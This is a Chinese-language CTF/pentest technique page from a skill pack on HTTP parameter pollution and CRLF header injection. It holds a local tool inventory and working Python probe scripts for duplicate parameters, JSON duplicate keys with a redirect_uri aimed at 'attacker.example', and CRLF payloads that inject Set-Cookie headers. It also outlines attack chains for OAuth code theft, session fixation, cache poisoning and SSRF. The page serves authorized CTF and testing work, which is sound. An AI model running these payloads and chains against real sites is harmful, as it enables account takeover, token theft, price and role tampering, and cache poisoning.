# HPP / CRLF Injection / Header Injection

> **来源**：改编自 `LING71671/open-reverselab` 的 `kb/ctf-website/techniques/03-injection/hpp-crlf.md`（GPL-3.0）。原 frontmatter 的 `mcp_tools` 映射已剔除——本技能包未挂载 `run_ctf_tool` / `http_probe`，改用本地工具链。
> **授权范围**：仅限 CTF 靶场 / AWD 赛场 / 已签署授权的测试环境。任何真实第三方目标、真实凭据、真实支付/生产流量都禁止套用本文流程。
> **什么时候用**：命中「HPP / 参数污染 / CRLF / 换行注入」这类信号时，把本文当打点清单读；命中即进「步骤」，命中不了就换主题。

## 适用信号

- HPP
- 参数污染
- CRLF
- 换行注入
- 响应拆分
- WAF bypass
- Header注入
- email注入
- duplicate parameter

## 前置

- 授权：目标在 scope 内（`case-init.ps1` 已 grant），测试时段与限速已约定。
- 工具定位走探测层，别猜路径：

```powershell
. 'C:\relab2\skillpack\skills\scripts\lib\Bootstrap.ps1'
$r = Resolve-ReverseToolSpec -Name '<toolid>'   # 例：sqlmap / httpx / ffuf / curl / python
& $r.Command <参数>                                # 永远用完整路径，不依赖 cwd
```

- Python 解释器用探测层的 `python`（本机逆向库集中在 `D:\EXE\python\python.exe`，`venv-re` 是空壳，别去那里找库）。
- 本文脚本默认只读、只打点；扩大范围前先回到 scope 确认。
- 本文涉及的工具与本机实际状态（探测层 `Resolve-ReverseToolSpec` 于 2026-10-10 实测）：

| 工具 | 本机状态 | 本机命令 / 替代方案 |
|---|---|---|
| `playwright` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'playwright').Command ...` → `D:\Tools\Node\playwright.cmd` |
| `objection` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'objection').Command ...` → `D:\EXE\python\Scripts\objection.exe` |
| `subfinder` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'subfinder').Command ...` → `D:\Tools\subfinder\subfinder.exe` |
| `gobuster` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'gobuster').Command ...` → `D:\Tools\gobuster\gobuster.exe` |
| `mitmdump` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'mitmdump').Command ...` → `D:\EXE\python\Scripts\mitmdump.exe` |
| `binwalk` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'binwalk').Command ...` → `C:\Users\toti\.cargo\bin\binwalk.exe` |
| `openssl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'openssl').Command ...` → `C:\Program Files\Git\usr\bin\openssl.exe` |
| `katana` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'katana').Command ...` → `D:\Tools\katana\katana.exe` |
| `nuclei` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nuclei').Command ...` → `D:\Tools\nuclei\nuclei.exe` |
| `python` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'python').Command ...` → `D:\EXE\python\python.exe` |
| `sqlmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'sqlmap').Command ...` → `D:\Tools\sqlmap\sqlmap.py` |
| `tshark` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'tshark').Command ...` → `D:\Tools\Wireshark\tshark.exe` |
| `frida` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'frida').Command ...` → `D:\EXE\python\Scripts\frida.exe` |
| `httpx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'httpx').Command ...` → `D:\Tools\httpx\httpx.exe` |
| `naabu` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'naabu').Command ...` → `D:\Tools\naabu\naabu.exe` |
| `curl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'curl').Command ...` → `C:\WINDOWS\system32\curl.exe` |
| `dnsx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'dnsx').Command ...` → `D:\Tools\dnsx\dnsx.exe` |
| `ffuf` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'ffuf').Command ...` → `D:\Tools\ffuf\ffuf.exe` |
| `nmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nmap').Command ...` → `D:\Tools\nmap\nmap.exe` |
| `node` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'node').Command ...` → `D:\Tools\Node\node.exe` |
| `adb` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'adb').Command ...` → `D:\Tools\android\AndroidKiller_fix\bin\adb\adb.exe` |
| `git` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'git').Command ...` → `C:\Program Files\Git\cmd\git.exe` |
| `interactsh-client` | 未安装 | OOB 通道需自备回显服务（授权环境内的 VPS + `python -m http.server`）；本机无此工具 |
| `nuclei-templates` | 随 nuclei 提供 | `nuclei -t <模板目录>`；模板需联网 `-update-templates` |

- 上表中标「未安装」的工具**不要照抄原库的裸命令**：`Get-Command` 查空就下结论是错的，
  但四级探测 `Available=False` 是结论——此时按替代方案手写脚本，或先装再跑。


## 步骤

1. **PHP** — WAF 看 first，业务用 last
2. **Java Servlet** — 中间件/业务分叉
3. **ASP.NET** — 拼接后绕过枚举
4. **Express `qs`** — 类型混淆、PP 串联
5. **Flask/Werkzeug** — 业务取值点差异
6. **Go `net/http`** — handler 自定义分叉

## 判据

判据必须是外部可观测的（状态码、响应字段、差分、落盘文件），不是「命令有输出」。

- **命中样本** — `role=user&role=admin` 命中不同分支
- **失败样本** — 框架固定取值且业务不受影响
- **命中样本** — WAF 放行，业务进入 payload 分支
- **失败样本** — 两层都看同一值
- **命中样本** — 响应头出现新增 header
- **失败样本** — header 编码或丢弃换行
- **命中样本** — SSRF 下游请求差异
- **失败样本** — URL parser 拒绝控制字符
- **命中样本** — 邮件头/正文结构改变
- **失败样本** — mailer 做 header encoding
- **命中样本** — WAF/业务取不同值
- **失败样本** — JSON parser 同层处理

## 坑

- 探针命令在**未本机验证**时不要当成既定事实跑；先用探测层确认 `Available=True`。
- 噪声排除：先固定 baseline（同 URL 同 token 跑 3 次），再只改一个变量做差分。
- 不要把「状态码 200」当命中——WAF/缓存/软 404 都返回 200，命中判据要落到具体业务字段。

## 相关

- 见本技能 `../../SKILL.md` 的 references 索引。

## 技术正文

> 以下为原库正文（保留全部技术细节与脚本），仅移除原 `MCP 工具映射` 章节并重写跨文档链接。

HPP 是参数取值差异，CRLF 是头部边界差异。二者的共同点是：前置层、中间件、业务代码和下游服务看到的“同一个输入”不一定相同。

## 输入信号

| 信号 | 立即动作 | 命中样本 | 失败样本 |
|---|---|---|---|
| 同参数重复时响应变化 | first/last/array/join 取值矩阵 | `role=user&role=admin` 命中不同分支 | 框架固定取值且业务不受影响 |
| WAF/业务错误不一致 | benign first + payload second | WAF 放行，业务进入 payload 分支 | 两层都看同一值 |
| redirect/header 可控 | 注入 `%0d%0aX-Test:` | 响应头出现新增 header | header 编码或丢弃换行 |
| URL 被后端请求 | CRLF 改 Host/header/path | SSRF 下游请求差异 | URL parser 拒绝控制字符 |
| 邮件/邀请/反馈表单 | Subject/Bcc/Content-Type 头差分 | 邮件头/正文结构改变 | mailer 做 header encoding |
| JSON body 允许重复键 | `{"a":1,"a":2}` | WAF/业务取不同值 | JSON parser 同层处理 |

## 工作流

```text
建立 baseline 参数和 header
  → 构造 duplicate/query/json/form 取值矩阵
  → 对比 WAF/业务/下游响应差异
  → 对 Location/Set-Cookie/Cache/Email/SSRF sink 测 CRLF
  → 用响应头、回连、邮件、缓存或状态变化证明命中
```

## 0. HPP 取值矩阵

| 平台/解析器 | 常见行为 | 利用方向 |
|---|---|---|
| PHP | 最后一个 | WAF 看 first，业务用 last |
| Java Servlet | `getParameter` first，`getParameterValues` all | 中间件/业务分叉 |
| ASP.NET | 逗号 join | 拼接后绕过枚举 |
| Express `qs` | array/object | 类型混淆、PP 串联 |
| Flask/Werkzeug | first，`getlist` all | 业务取值点差异 |
| Go `net/http` | first，Values 保留 all | handler 自定义分叉 |

## 1. HPP oracle

```python
#!/usr/bin/env python3
import argparse
import hashlib
import json
import requests
from urllib.parse import urlencode

def digest(text):
    return hashlib.sha256(text.encode("utf-8", errors="ignore")).hexdigest()[:16]

def cases(param, a, b):
    return [
        ("first_second", [(param, a), (param, b)]),
        ("second_first", [(param, b), (param, a)]),
        ("array_suffix", [(param, a), (param + "[]", b)]),
        ("encoded_amp", [(param, a + "%26" + param + "=" + b)]),
        ("semicolon", f"{param}={a};{param}={b}"),
        ("comma_join", [(param, f"{a},{b}")]),
    ]

def hit(url, params):
    if isinstance(params, str):
        sep = "&" if "?" in url else "?"
        r = requests.get(url + sep + params, timeout=10)
    else:
        r = requests.get(url, params=params, timeout=10)
    return {"url": r.url, "status": r.status_code, "hash": digest(r.text), "location": r.headers.get("Location",""), "sample": r.text[:180]}

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--param", required=True)
    ap.add_argument("--normal", default="user")
    ap.add_argument("--payload", default="admin")
    args = ap.parse_args()
    for name, params in cases(args.param, args.normal, args.payload):
        print(json.dumps({"case": name, "result": hit(args.url, params)}, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

成功样本：同一语义参数的顺序/数组/编码导致身份、价格、redirect、SQL/SSTI 过滤结果或响应 hash 稳定变化。失败样本：所有变体同一 hash，说明当前参数未被多层差异处理。

## 2. JSON duplicate key

```python
#!/usr/bin/env python3
import argparse
import hashlib
import json
import requests

def h(text):
    return hashlib.sha256(text.encode("utf-8", errors="ignore")).hexdigest()[:16]

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--cookie", default="")
    args = ap.parse_args()
    bodies = {
        "role_user_admin": '{"role":"user","role":"admin"}',
        "price_high_low": '{"price":1000,"price":1}',
        "redirect_safe_evil": '{"redirect_uri":"https://safe.example","redirect_uri":"https://attacker.example"}',
    }
    headers = {"Content-Type": "application/json"}
    if args.cookie:
        headers["Cookie"] = args.cookie
    for name, body in bodies.items():
        r = requests.post(args.url, data=body, headers=headers, timeout=10)
        print(json.dumps({"case": name, "status": r.status_code, "hash": h(r.text), "sample": r.text[:180]}, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

## 3. CRLF sink 矩阵

| Sink | Payload | 命中样本 | 失败样本 |
|---|---|---|---|
| `Location` | `%0d%0aSet-Cookie: crlf=1` | 响应头新增 cookie/header | header value 被 encode |
| `Set-Cookie` | `%0d%0aX-Injected: 1` | 新 header 出现 | cookie parser 拒绝 |
| cache key/header | `%0d%0aCache-Control: public` | 缓存状态改变 | CDN 丢弃换行 |
| SSRF URL | `%0d%0aHost: internal` | 下游 listener 看到 header | URL parser reject |
| email subject/name | `x%0d%0aBcc: ...` | 邮件头结构变化 | mailer 编码头部 |

```python
#!/usr/bin/env python3
import argparse
import json
import requests

PAYLOADS = [
    "%0d%0aX-Injected: crlf_probe",
    "%0D%0ASet-Cookie:%20crlf_probe=1",
    "%0aX-Injected:%20lf_probe",
    "%0dX-Injected:%20cr_probe",
    "%250d%250aX-Injected:%2520double_encoded",
]

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True, help="Use {payload} placeholder")
    args = ap.parse_args()
    for p in PAYLOADS:
        url = args.url.replace("{payload}", p)
        r = requests.get(url, allow_redirects=False, timeout=10)
        interesting = {k: v for k, v in r.headers.items() if "Injected" in k or "Set-Cookie" in k or "Location" in k}
        print(json.dumps({"payload": p, "status": r.status_code, "headers": interesting, "body": r.text[:120]}, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

## 4. 组合攻击链

```text
HPP redirect_uri
  → OAuth 中间件取 first，业务取 last
  → code/token 回到 attacker callback

HPP amount/role
  → WAF/校验层看 normal
  → 业务层取 payload
  → 订单、权限、flag 差异

CRLF Location
  → 响应头注入 Set-Cookie/Cache-Control
  → session fixation / cache poisoning / XSS 二跳

CRLF SSRF URL
  → 下游 Host/header/path 差异
  → 内网服务探测或协议拼接
```

## Evidence

| 项 | 记录内容 |
|---|---|
| 参数矩阵 | 参数名、顺序、编码、数组/分号/JSON 重复键 |
| 解析差异 | WAF/中间件/业务/下游响应状态、hash、错误文本 |
| Header sink | 可控 header、payload 编码层数、新增响应头 |
| 成功样本 | redirect、cookie、cache、订单、权限、OAuth code、flag 差异 |
| 失败样本 | 所有变体同 hash、换行被编码、pre-parser 拒绝控制字符 |
| 下一跳 | redirect 转 OAuth；cache 转 08-infra；SSRF 转 04-ssrf；金额转 payment |
